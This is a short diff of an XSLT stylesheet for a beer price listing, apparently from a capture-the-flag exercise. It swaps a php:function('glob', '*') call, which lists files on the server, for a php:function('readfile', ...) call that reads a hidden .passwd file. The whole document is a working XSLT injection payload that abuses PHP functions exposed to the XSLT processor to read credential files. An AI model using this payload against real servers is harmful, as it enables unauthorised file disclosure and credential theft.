@@ -3,7 +3,7 @@
 <body style="font-family:Arial;font-size:12pt;background-color:#EEEEEE">
 <xsl:for-each select="beers/beer">
   <div style="background-color:teal;color:white;padding:4px">
-    <span style="font-weight:bold"><xsl:value-of select="php:function('glob', '*')"/> - </span>
+    <span style="font-weight:bold"><xsl:value-of select="php:function('readfile', '.6ff3200bee785801f420fba826ffcdee/.passwd')"/> - </span>
     <xsl:value-of select="price"/>
     </div>
   <div style="margin-left:20px;margin-bottom:1em;font-size:10pt">
